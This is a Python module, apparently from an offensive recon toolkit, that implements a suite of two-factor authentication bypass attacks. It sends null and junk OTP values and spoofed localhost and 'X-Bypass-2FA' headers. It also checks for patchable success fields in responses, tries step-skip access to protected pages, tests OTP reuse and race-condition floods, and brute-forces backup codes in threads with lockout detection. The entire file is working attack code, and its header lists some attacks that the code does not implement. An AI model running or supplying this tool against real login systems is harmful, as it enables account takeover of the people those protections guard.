"""
twofa_bypass.py
===============
2FA/MFA Bypass Attack Suite:
  - Response manipulation (change JSON status/success fields)
  - Backup code brute-force (6-8 digit numeric, alpha-numeric combos)
  - OTP race condition (parallel request flood within time window)
  - OTP reuse (test if same OTP accepted twice)
  - Code length manipulation (shorter/longer codes)
  - Null/empty OTP bypass
  - Header-based bypass (X-Forwarded-For, X-Original-IP admin routes)
  - JWT-based 2FA bypass (remove 2FA claim)
  - Step skip (access post-auth page before completing 2FA)
  - SMS/Email OTP interception clues detection
  - Brute-force with lockout detection and delay
"""

from __future__ import annotations

import json
import re
import ssl
import time
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def _request(url: str, method: str = "POST", data: Optional[Dict] = None,
              headers: Optional[Dict] = None, timeout: float = 10.0,
              cookies: Optional[str] = None) -> Tuple[int, str, Dict]:
    try:
        body_bytes = None
        if data:
            body_bytes = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=body_bytes, method=method)
        req.add_header("User-Agent", "Mozilla/5.0 PhantomRecon/1.0")
        if cookies:
            req.add_header("Cookie", cookies)
        if data:
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("utf-8", errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode("utf-8", errors="replace")
        except Exception:
            b = ""
        return e.code, b, {}
    except Exception as e:
        return 0, str(e), {}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class TwoFAFinding:
    attack:   str
    severity: str
    title:    str
    evidence: str
    payload:  Optional[str] = None
    details:  Dict = field(default_factory=dict)

SUCCESS_INDICATORS = [
    "success", "authenticated", "logged in", "welcome", "dashboard",
    "home", "redirect", "token", "access_token", "session",
]
FAILURE_INDICATORS = [
    "invalid", "incorrect", "error", "failed", "wrong", "expired",
    "too many", "locked", "blocked", "forbidden",
]
LOCKOUT_INDICATORS = [
    "locked", "too many", "blocked", "rate limit", "temporarily",
    "maximum", "exceeded", "wait",
]


def _is_success(code: int, body: str) -> bool:
    if code == 200 and any(i in body.lower() for i in SUCCESS_INDICATORS):
        return True
    if code in (301, 302, 303):
        return True
    return False

def _is_locked(body: str) -> bool:
    return any(i in body.lower() for i in LOCKOUT_INDICATORS)


# ---------------------------------------------------------------------------
# Attack 1: Response manipulation
# ---------------------------------------------------------------------------

RESPONSE_MANIPULATION_PATCHES = [
    ('"success":false',  '"success":true'),
    ('"success": false', '"success": true'),
    ('"verified":false', '"verified":true'),
    ('"verified": false', '"verified": true'),
    ('"status":"error"', '"status":"ok"'),
    ('"status": "error"', '"status": "ok"'),
    ('"valid":false',    '"valid":true'),
    ('"error":true',     '"error":false'),
    ('"2fa_required":true', '"2fa_required":false'),
    ('"mfa_required":true', '"mfa_required":false'),
    ('"otp_required":true', '"otp_required":false'),
    ('"two_factor_required":true', '"two_factor_required":false'),
    ('"code":401',       '"code":200'),
    ('"code": 401',      '"code": 200'),
    ('"authenticated":false', '"authenticated":true'),
]


class ResponseManipulationBypass:
    def check(self, verify_url: str, otp_param: str, valid_session_cookies: str,
              extra_data: Optional[Dict] = None) -> Optional[TwoFAFinding]:
        for wrong_otp in ["000000", "111111", "999999", "123456"]:
            data = {otp_param: wrong_otp}
            if extra_data:
                data.update(extra_data)
            code, body, headers = _request(
                verify_url, "POST", data, cookies=valid_session_cookies
            )
            for wrong_str, correct_str in RESPONSE_MANIPULATION_PATCHES:
                if wrong_str in body:
                    return TwoFAFinding(
                        attack="response_manipulation",
                        severity="critical",
                        title="2FA Response Manipulation Possible",
                        evidence=f"Response contains manipulatable field: {wrong_str!r} → {correct_str!r}",
                        details={"url": verify_url, "pattern": wrong_str},
                    )
        return None


# ---------------------------------------------------------------------------
# Attack 2: Backup code brute-force
# ---------------------------------------------------------------------------

class BackupCodeBruteForce:
    def _generate_codes(self, length: int = 8, numeric_only: bool = True) -> List[str]:
        if numeric_only:
            return [str(i).zfill(length) for i in range(10 ** length)]
        import string
        import itertools
        charset = string.digits + string.ascii_uppercase
        return ["".join(c) for c in itertools.product(charset, repeat=length)]

    def brute_force(self, verify_url: str, otp_param: str,
                    session_cookies: str, code_length: int = 8,
                    max_attempts: int = 1000, delay: float = 0.1,
                    threads: int = 5) -> Optional[TwoFAFinding]:
        codes = [str(i).zfill(code_length) for i in range(max_attempts)]
        found: List[Optional[str]] = [None]
        lock  = threading.Lock()

        def _try(code: str) -> Optional[str]:
            if found[0]:
                return None
            code_c, body, _ = _request(
                verify_url, "POST",
                {otp_param: code},
                cookies=session_cookies,
            )
            if _is_locked(body):
                return "LOCKED"
            if _is_success(code_c, body):
                return code
            time.sleep(delay)
            return None

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = {ex.submit(_try, c): c for c in codes}
            for ft in as_completed(futs):
                r = ft.result()
                if r == "LOCKED":
                    break
                if r:
                    with lock:
                        found[0] = r

        if found[0]:
            return TwoFAFinding(
                attack="backup_code_brute_force",
                severity="critical",
                title=f"2FA Backup Code Cracked: {found[0]}",
                evidence=f"Backup code {found[0]!r} accepted at {verify_url}",
                details={"code": found[0], "code_length": code_length},
            )
        return None


# ---------------------------------------------------------------------------
# Attack 3: OTP race condition
# ---------------------------------------------------------------------------

class OTPRaceConditionAttack:
    def attack(self, verify_url: str, otp_param: str,
               known_otp: str, session_cookies: str,
               parallel_requests: int = 20) -> Optional[TwoFAFinding]:
        results: List[Tuple[int, str]] = []
        lock = threading.Lock()

        def _send() -> None:
            code, body, _ = _request(
                verify_url, "POST",
                {otp_param: known_otp},
                cookies=session_cookies,
            )
            with lock:
                results.append((code, body))

        threads = [threading.Thread(target=_send) for _ in range(parallel_requests)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        successes = sum(1 for c, b in results if _is_success(c, b))
        if successes > 1:
            return TwoFAFinding(
                attack="otp_race_condition",
                severity="high",
                title=f"OTP Race Condition — {successes}/{parallel_requests} parallel requests succeeded",
                evidence=f"OTP {known_otp!r} accepted {successes} times in {parallel_requests} simultaneous requests",
                details={"successes": successes, "total": parallel_requests},
            )
        return None


# ---------------------------------------------------------------------------
# Attack 4: OTP reuse
# ---------------------------------------------------------------------------

class OTPReuseAttack:
    def check(self, verify_url: str, otp_param: str,
              known_otp: str, session_cookies: str) -> Optional[TwoFAFinding]:
        code1, body1, _ = _request(verify_url, "POST",
                                    {otp_param: known_otp}, cookies=session_cookies)
        if not _is_success(code1, body1):
            return None

        code2, body2, _ = _request(verify_url, "POST",
                                    {otp_param: known_otp}, cookies=session_cookies)
        if _is_success(code2, body2):
            return TwoFAFinding(
                attack="otp_reuse",
                severity="high",
                title="OTP reuse allowed — same code accepted twice",
                evidence=f"OTP {known_otp!r} accepted on second use at {verify_url}",
            )
        return None


# ---------------------------------------------------------------------------
# Attack 5: Null / empty OTP bypass
# ---------------------------------------------------------------------------

class NullOTPBypass:
    NULL_VALUES = [
        "", "null", "undefined", "0", "000000", "false", "none",
        " ", "\x00", "\n", "NaN", "true", "1", "[]", "{}",
    ]

    def check(self, verify_url: str, otp_param: str,
              session_cookies: str) -> Optional[TwoFAFinding]:
        for val in self.NULL_VALUES:
            code, body, _ = _request(
                verify_url, "POST", {otp_param: val}, cookies=session_cookies
            )
            if _is_success(code, body):
                return TwoFAFinding(
                    attack="null_otp_bypass",
                    severity="critical",
                    title=f"Null/empty OTP bypass — value {val!r} accepted",
                    evidence=f"OTP field {otp_param!r}={val!r} bypassed 2FA at {verify_url}",
                    details={"bypass_value": val},
                )
        return None


# ---------------------------------------------------------------------------
# Attack 6: Step skip (direct access to protected resource)
# ---------------------------------------------------------------------------

class StepSkipAttack:
    def check(self, protected_urls: List[str], session_cookies: str) -> List[TwoFAFinding]:
        findings = []
        for url in protected_urls:
            code, body, _ = _request(url, "GET", cookies=session_cookies)
            if _is_success(code, body) and not any(
                skip in body.lower() for skip in ["2fa", "otp", "verify", "mfa", "two_factor"]
            ):
                findings.append(TwoFAFinding(
                    attack="step_skip",
                    severity="critical",
                    title=f"2FA step skip — direct access to {url}",
                    evidence=f"Accessed protected resource without completing 2FA (status {code})",
                    details={"url": url},
                ))
        return findings


# ---------------------------------------------------------------------------
# Attack 7: Header-based bypass
# ---------------------------------------------------------------------------

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Admin": "true"},
    {"X-Internal": "1"},
    {"X-Bypass-2FA": "true"},
    {"X-Skip-MFA": "1"},
]


class HeaderBypass:
    def check(self, verify_url: str, otp_param: str,
              session_cookies: str) -> List[TwoFAFinding]:
        findings = []
        for header_set in BYPASS_HEADERS:
            code, body, _ = _request(
                verify_url, "POST",
                {otp_param: "000000"},
                headers=header_set,
                cookies=session_cookies,
            )
            if _is_success(code, body):
                findings.append(TwoFAFinding(
                    attack="header_bypass",
                    severity="critical",
                    title=f"2FA bypass via header: {list(header_set.keys())[0]}",
                    evidence=f"Header {header_set} bypassed 2FA check",
                    details={"headers": header_set},
                ))
        return findings


# ---------------------------------------------------------------------------
# Master 2FA Attacker
# ---------------------------------------------------------------------------

class TwoFAAttacker:
    def __init__(self):
        self.response_manip = ResponseManipulationBypass()
        self.backup_brute   = BackupCodeBruteForce()
        self.race           = OTPRaceConditionAttack()
        self.reuse          = OTPReuseAttack()
        self.null_bypass    = NullOTPBypass()
        self.step_skip      = StepSkipAttack()
        self.header_bypass  = HeaderBypass()

    def full_attack(
        self,
        verify_url:      str,
        otp_param:       str       = "otp",
        session_cookies: str       = "",
        known_otp:       Optional[str] = None,
        protected_urls:  Optional[List[str]] = None,
        run_brute:       bool      = False,
        brute_length:    int       = 6,
        brute_max:       int       = 100,
        extra_data:      Optional[Dict] = None,
    ) -> Dict:
        findings = []

        r = self.null_bypass.check(verify_url, otp_param, session_cookies)
        if r:
            findings.append(r.__dict__)

        r = self.response_manip.check(verify_url, otp_param, session_cookies, extra_data)
        if r:
            findings.append(r.__dict__)

        for f in self.header_bypass.check(verify_url, otp_param, session_cookies):
            findings.append(f.__dict__)

        if protected_urls:
            for f in self.step_skip.check(protected_urls, session_cookies):
                findings.append(f.__dict__)

        if known_otp:
            r = self.reuse.check(verify_url, otp_param, known_otp, session_cookies)
            if r:
                findings.append(r.__dict__)
            r = self.race.attack(verify_url, otp_param, known_otp, session_cookies)
            if r:
                findings.append(r.__dict__)

        if run_brute:
            r = self.backup_brute.brute_force(
                verify_url, otp_param, session_cookies,
                code_length=brute_length, max_attempts=brute_max,
            )
            if r:
                findings.append(r.__dict__)

        return {"verify_url": verify_url, "findings": findings}
